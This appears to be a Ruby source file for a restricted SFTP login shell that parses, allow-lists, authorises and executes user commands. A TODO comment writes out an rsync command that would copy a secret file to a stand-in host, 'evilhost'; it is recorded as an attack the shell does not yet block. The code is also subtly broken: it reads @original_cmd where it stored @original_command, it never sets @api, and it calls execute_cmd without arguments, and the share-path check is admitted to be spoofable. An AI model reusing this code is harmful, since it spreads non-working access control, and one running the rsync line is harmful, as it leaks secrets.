# frozen_string_literal: true

require 'shellwords'
require 'logger'

require_relative 'config'
require_relative 'errors'
require_relative 'api'

module SFTPShell
  class Shell
    attr_accessor :config,
                  :logger,
                  :user

    def initialize(user_id, original_command)
      @user_id = user_id
      @original_command = original_command

      @config = Config.read
      @logger = Logger.new @config['shell']['log']
    end

    def exec
      @user = API::User.new @user_id

      @logger.info "Authenticated user #{@user.id}"
      puts "sftp-shell: Welcome, #{@user.name}!"

      if @original_cmd.nil?
        false
      else
        parse_cmd
        verify_access
        execute_cmd
        true
      end
    rescue AccessDeniedError => _
      @logger.warn "Access denied for user #{@user_id}: #{@original_cmd}"
      puts "sftp-shell: #{@original_cmd}: Access denied."
      false
    rescue DisallowedCommandError => _
      @logger.warn "Command not allowed for user #{@user_id}: #{@original_cmd}"
      puts "sftp-shell: #{@cmd.first}: Command not allowed."
      false
    rescue InvalidSharePathError => _
      @logger.warn "Invalid share path for user #{@user_id}: #{@original_cmd}"
      puts "sftp-shell: #{@original_cmd}: Invalid share path"
      false
    rescue ServerError => ex
      @logger.error "Server error for user #{@user_id}: #{@original_command}"
      @logger.error ex
      puts 'sftp-shell: Server error'
      false
    end

    private

    def parse_cmd
      @cmd = Shellwords.shellwords @original_cmd

      raise DisallowedCommandError unless @config['allowed_cmds'].include? @cmd.first

      # TODO: prevent running rsync client (ssh sftp@myhost 'rsync files/SECRET user@evilhost:SECRET')
      # TODO: prevent spoofing share path
      @share_path = File.expand_path(File.join @config['storage_path'], @cmd.last)

      @logger.info "Accessing share path #{@share_path}"
    end

    def verify_access
      raise InvalidSharePathError unless @share_path.start_with? @config['storage_path']

      @share = @api.get_share @share_path
      raise InvalidSharePathError unless @share

      access = @api.check_access @share, @user
      raise AccessDeniedError unless access
    end

    def execute_cmd(*args)
      env = {
        'HOME' => ENV['HOME'],
        'PATH' => ENV['PATH'],
        'LD_LIBRARY_PATH' => ENV['LD_LIBRARY_PATH'],
        'LANG' => ENV['LANG'],
        'SFTP_USER_NAME' => @user.name
      }

      Kernel.exec env, *args, :unsetenv_others => true
    end
  end
end
